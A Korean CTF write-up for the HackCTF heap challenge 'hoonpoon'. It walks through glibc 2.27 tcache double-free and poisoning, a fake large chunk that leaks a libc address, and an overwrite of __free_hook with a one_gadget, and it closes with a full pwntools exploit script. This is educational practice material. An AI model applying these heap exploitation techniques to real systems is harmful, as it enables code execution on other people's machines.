---
layout: post
title:  "HacCTF 훈폰정음 write-up"
date:   2020-03-28 19:45:55
image:  hackctf_hoon_poon.PNG
tags:   [Hackctf]
categories: [Write-up]
---

# [HackCTF] 훈폰정음

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled.png)

모든 보호기법이 다 걸려있다



**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%201.png)

1번부터 5번까지의 메뉴가 있다. 1번이 입력, 2번이 수정, 3번이 삭제, 4번이 확인 마지막 5번이 종료와 관련된 메뉴이다. 



**3) 코드흐름 파악**

- **add() 함수**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%202.png)

    table[7] 전역변수에 총 7번의 malloc 이 가능하다. 위 코드는 입력한 인덱스가 0이상 6이하 일때만 다음 로직을 진행하는 조건문이다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%203.png)

    또한 입력할수 있는 사이즈는 최대 0x400이다. 이 조건을 만족해야지만 malloc이 수행되고, table[index] 배열에 저장된다



- **edit()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%204.png)

    edit 함수역시 인덱스 0 ~ 6 값만 수정가능하고, 사이즈는 add()함수에서 입력한 값을 고정으로 하여 안의 내용물만 바꾼다. get_read함수를 이용하여 입력한다



- **delete()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%205.png)

    count 전역변수는 초기값이 5인데 0이 되면 free가 안된다. 하지만 이상태에서 한번더 delete() 함수를 호출하면 음수값이 되므로 상관없다. 즉 free의 개수는 제한이 없다  


- **check()**

    ![HackCTF/Untitled%206.png](HackCTF/Untitled%206.png)

    check() 함수는 원하는 table의 인덱스를 입려하면 해당 청크의 데이터를 출력해주는 함수이다.





### 2. 접근방법

---

이번 문제는 glibc 2.27 환경이므로 tcache가 사용될 것이다. 현재 제약사항은 다음과 같다

- malloc은 최대 7번까지 가능
- free를 6번 하고 싶으면 count 변수를 5 → 0 만들기위해 delete()함수를 총 5번 호출하고 한번더 호출하면 count=0 이 되서 free안됌. 이상태에서 한번더 delete()함수를 호출하면 그때 free가능

    따라서 총 7번 delete()함수를 호출하면 됨

해당 문제를 풀기 전 tcache의 구조를 먼저 공부했기 때문에 DFB, tcache dup, tcache poisoning 을 이용해서 libc_base 주소를 leak한뒤 조지면 끝이다

- tcache 공부자료

    [Heap 기초4](https://www.notion.so/Heap-4-791f5e0030b444fb92487ce3b77e2c97)

우리의 목적은 free 되 청크가 unsorted bin에 들어가게 하는 것이다. 그래야 해당 청크의 fd에 main_arena+88 의 주소가 들어가서 libc leak이 가능하기 때문이다.

unsorted bin에 free청크를 넣는 방법은 크게 두가지이다.

1. large bin 사이즈 청크가 free될 시 tcache에 안들어가고 바로 unsorted bin에 들어감

    ⇒ fake chunk를 만들어서 기존의 청크 사이즈를 large chunk로 바꾼뒤 해당 청크 free

2. small bin 사이즈 청크가 tcahe가 7개 꽉찼을때는 unsorted bin에 들어감

    ⇒ DFB를 이용해서 tcache 꽉채우기



- **첫번째 시나리오**
    1. ' childheap ' 문제에서 한것처럼 fake chunk로 size를 주작하여 large chunk free시키기
    2. unsorted bin에 청크가 들어갔다면, check() 함수를 이용하여 fd값 즉, main_arena+88 값을 leak하기
    3. 해당 leak된 주소로 libc_base 구하기
    4. free_hook을 one_gadet으로 덮기





### 3. 풀이

---

**1) 첫번째 시나리오**

1. ' childheap ' 문제에서 한것처럼 fake chunk로 size를 주작하여 large chunk free시키기

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%207.png)

    - 현재 add로 0번 인덱스에 0x20 사이즈 만큼 malloc을 한후, free(0), free(0)번이 일어난 상황이다
    - 이 상태에서 edit() 함수로 0번인덱스를 선택하여 "\x58"를 삽입한다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%208.png)

    - 끝에 한바이트가 0x58로 바꼇다. 이상태에서 add(0x20)을 한다면 0x5577034f4250을 청크헤더로 하는 청크를 재할당해주고 입력한 값은 0x5577034f4260에 들어갈 것이다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%209.png)

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%2010.png)

    - table[1]은 재할당을 받았기 때문에  table[0]의 값과 동일하다.
    - 여기서 add(0x20)을 한번더 한다면 tcache에 0x5577034f3258이 있으므로 0x5577034f3248을 헤더로하는 청크를 반환해줄 것이다. 그리고 입력한 값은 0x5577034f3258에 들어가게 되는데, 여기에는 현재 아까 index(0)의 청크 사이즈인 0x31이 들어가 있다
    - 따라서 해당 값을 변조해서 , free(0)를 하면 되는 것이다

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%2011.png)

    - add(0x20)으로 malloc을 하고 0x421을 입력한 상태이다. 값이 잘 들어갔고, table[0]을 free시키면 청크 사이즈를 0x421로 판단하여 tcache가 아닌, unsorted bin에 넣을 것이다
    - 하지만 현재 해당 청크를 그냥 free 시킨다면, top 청크와 0x20 크기 밖에 차이가 안난상태이므로 에러가 난다.
    - 따라서 0x400 사이즈 청크를 하나 더 할당해주고 top 청크와이 거리를 맞추기 위해 적절한 오프셋을 페이로드 끝부분에 삽입해야 한다

        gdb-peda$  x/150gx 0x5577034f4250
        0x5577034f4250:	0x0000000000000000	0x0000000000000421
        0x5577034f4260:	0x00005577034f4244	0x0000000000000010
        0x5577034f4270:	0x0000000000000000	0x0000000000000000
        0x5577034f4280:	0x0000000000000000	0x0000000000000411
        0x5577034f4290:	0x0000000000000021	0x0000000000000021
        0x5577034f42a0:	0x0000000000000021	0x0000000000000021
        0x5577034f42b0:	0x0000000000000021	0x0000000000000021
        0x5577034f42c0:	0x0000000000000021	0x0000000000000021
        0x5577034f42d0:	0x0000000000000021	0x0000000000000021
        0x5577034f42e0:	0x0000000000000021	0x0000000000000021
        0x5577034f42f0:	0x0000000000000021	0x0000000000000021
        0x5577034f4300:	0x0000000000000021	0x0000000000000021
        0x5577034f4310:	0x0000000000000021	0x0000000000000021
        0x5577034f4320:	0x0000000000000021	0x0000000000000021
        0x5577034f4330:	0x0000000000000021	0x0000000000000021
        0x5577034f4340:	0x0000000000000021	0x0000000000000021
        0x5577034f4350:	0x0000000000000021	0x0000000000000021
        0x5577034f4360:	0x0000000000000021	0x0000000000000021
        0x5577034f4370:	0x0000000000000021	0x0000000000000021
        0x5577034f4380:	0x0000000000000021	0x0000000000000021
        0x5577034f4390:	0x0000000000000021	0x0000000000000021
        0x5577034f43a0:	0x0000000000000021	0x0000000000000021
        0x5577034f43b0:	0x0000000000000021	0x0000000000000021
        0x5577034f43c0:	0x0000000000000021	0x0000000000000021
        0x5577034f43d0:	0x0000000000000021	0x0000000000000021
        0x5577034f43e0:	0x0000000000000021	0x0000000000000021
        0x5577034f43f0:	0x0000000000000021	0x0000000000000021
        0x5577034f4400:	0x0000000000000021	0x0000000000000021
        0x5577034f4410:	0x0000000000000021	0x0000000000000021
        0x5577034f4420:	0x0000000000000021	0x0000000000000021
        0x5577034f4430:	0x0000000000000021	0x0000000000000021
        0x5577034f4440:	0x0000000000000021	0x0000000000000021
        0x5577034f4450:	0x0000000000000021	0x0000000000000021
        0x5577034f4460:	0x0000000000000021	0x0000000000000021
        0x5577034f4470:	0x0000000000000021	0x0000000000000021
        0x5577034f4480:	0x0000000000000021	0x0000000000000021
        0x5577034f4490:	0x0000000000000021	0x0000000000000021
        0x5577034f44a0:	0x0000000000000021	0x0000000000000021
        0x5577034f44b0:	0x0000000000000021	0x0000000000000021
        0x5577034f44c0:	0x0000000000000021	0x0000000000000021
        0x5577034f44d0:	0x0000000000000021	0x0000000000000021
        0x5577034f44e0:	0x0000000000000021	0x0000000000000021
        0x5577034f44f0:	0x0000000000000021	0x0000000000000021
        0x5577034f4500:	0x0000000000000021	0x0000000000000021
        0x5577034f4510:	0x0000000000000021	0x0000000000000021
        0x5577034f4520:	0x0000000000000021	0x0000000000000021
        0x5577034f4530:	0x0000000000000021	0x0000000000000021
        0x5577034f4540:	0x0000000000000021	0x0000000000000021
        0x5577034f4550:	0x0000000000000021	0x0000000000000021
        0x5577034f4560:	0x0000000000000021	0x0000000000000021
        0x5577034f4570:	0x0000000000000021	0x0000000000000021
        0x5577034f4580:	0x0000000000000021	0x0000000000000021
        0x5577034f4590:	0x0000000000000021	0x0000000000000021
        0x5577034f45a0:	0x0000000000000021	0x0000000000000021
        0x5577034f45b0:	0x0000000000000021	0x0000000000000021
        0x5577034f45c0:	0x0000000000000021	0x0000000000000021
        0x5577034f45d0:	0x0000000000000021	0x0000000000000021
        0x5577034f45e0:	0x0000000000000021	0x0000000000000021
        0x5577034f45f0:	0x0000000000000021	0x0000000000000021
        0x5577034f4600:	0x0000000000000021	0x0000000000000021
        0x5577034f4610:	0x0000000000000021	0x0000000000000021
        0x5577034f4620:	0x0000000000000021	0x0000000000000021
        0x5577034f4630:	0x0000000000000021	0x0000000000000021
        0x5577034f4640:	0x0000000000000021	0x0000000000000021
        0x5577034f4650:	0x0000000000000021	0x0000000000000021
        0x5577034f4660:	0x0000000000000021	0x0000000000000021
        ------------------------------------------------------ 
        	-> delete(0)을 하면 0x420사이즈 이므로 여기까지 체크함. 따라서 여기서부터 탑청크까지 
        		 0x20 까지의 거리가 있으므로 아까 add(0x20)할때 0x21으로 채워주면, 
        		 0x5577034f4670 부터 0x20 크기의 청크가 있다고 판단하므로 에러가 안남.
        		 
        0x5577034f4670:	0x0000000000000021	0x0000000000000021
        0x5577034f4680:	0x0000000000000021	0x0000000000000021
        0x5577034f4690:	0x0000000000000000	0x0000000000020971

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%2012.png)

    - delete(0)를 하면 원하던 대로 unsorted bin에 들어가고 fd에 main_arena+88의 주소가 들어가 있음.

2. unsorted bin에 청크가 들어갔다면, check() 함수를 이용하여 fd값 즉, main_arena+88 값을 leak하기
    - 이건 check() 함수로 바로 leak하면 끝
3. 이제는 그냥 free_hook 덮어서 one_gadget 실행시키면 됨
    - libc 2.27에서는 tcache 청크 재할당시 chunk size검사를 하지 않으므로  0x7f 이렇게 맞춰줄필요 없음



**2) 두번째 시나리오**

1. unsorted bin에 청크를 삽입하는 다른 방법.

        add(0,0x100,p64(0)+p64(0x10))
        add(1,0x10,"A")
        delete(0)
        delete(0)
        delete(0)
        delete(0)
        delete(0)
        delete(0)
        delete(0)
        delete(0)

    - add(0x100) 만큼 할당받고, 이것도 마찬가지로 top 청크 사이의 거리를 맞춰주기 위해 add(0x10)한번 더함
    - 그다음 free를 8번 시키면 7개까지는 tcache로 들어가고, 마지막 free는 0x100 크기 이므로 unsorted bin에 들어감

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF/Untitled%2013.png)

2. 그다음은 첫번째 시나리오와 동일하게 진행하면 됨



최종 익스코드는 다음과 같다 (첫번째 시나리오 기준 익스 코드)

    # -*- coding: utf-8 -*-
    from pwn import *
    context(arch="amd64",os="linux",log_level="DEBUG")
    #p=remote("ctf.j0n9hyun.xyz",3041)
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.27.so")}
    p=process("./hoonpoon")
    e=ELF("./hoonpoon")
    libc=ELF("./libc-2.27.so")
    gdb.attach(p,'code\nb *0xb75+$code\n')
    
    def add(index,size,content):
    	p.sendlineafter(">> ","1")
    	p.sendlineafter("인덱스를 입력하시오:\n",str(index))
    	p.sendlineafter("크기를 입력하시오:\n",str(size))
    	p.sendafter("데이터를 입력하시오:\n",str(content))
    
    def update(index,content):
            p.sendlineafter(">> ","2")
            p.sendlineafter("인덱스를 입력하시오:\n",str(index))
            p.sendafter("수정할 데이터를 입력하시오:\n",str(content))
    
    def delete(index):
            p.sendlineafter(">> ","3")
            p.sendlineafter("인덱스를 입력하시오:\n",str(index))
    
    def check(index):
            p.sendlineafter(">> ","4")
            p.sendlineafter("인덱스를 입력하시오:\n",str(index))
    
    
    add(0,0x20,p64(0)+p64(0x10))
    
    delete(0)
    #pause()
    delete(0)
    
    update(0,p8(0x58))
    #pause()
    
    add(1,0x20,"A")
    add(2,0x20,p16(0x421))
    #gdb.attach(p,'code\nb *0xd03+$code\n')
    #pause()
    add(3,0x400,p64(0x21)*0x400)
    
    #pause()
    delete(0)
    #pause()
    check(0)
    p.recvuntil("그대의 데이터는 :")
    leak=u64(p.recv(6).ljust(8,'\x00'))
    log.info("leak::"+hex(leak))
    #pause()
    
    libc_base=leak-0x3ebca0
    freehook=libc_base+libc.symbols['__free_hook']
    one_gadet=libc_base+0x4f322
    #gdb.attach(p,'code\nb *0xc17+$code\n')
    
    add(4,0x100,"A")
    delete(4)
    delete(4)
    
    #pause()
    #gdb.attach(p,'code\nb *0xAAA+$code\n')
    
    update(4,p64(freehook))
    pause()
    #add(5,0x100,p8(0xe8))
    add(5,0x100,"A")
    pause()
    add(6,0x100,p64(one_gadet))
    
    delete(5)
    
    p.interactive()





### 4. 몰랐던 개념

---

- tcache 소스코드 분석을 하고 문제를 푸느라 오래걸렸다. 하지만 tcache와 관련된 문제는 쉽게 풀수 있을 것같다.
- 현재 2.29 이후부터는 연속으로 free를 못하게 막아놨다. 추후에 glibc 2.29 버전과 관련된 문제를 풀때 다시한번 추가된 코드를 정리해야겠다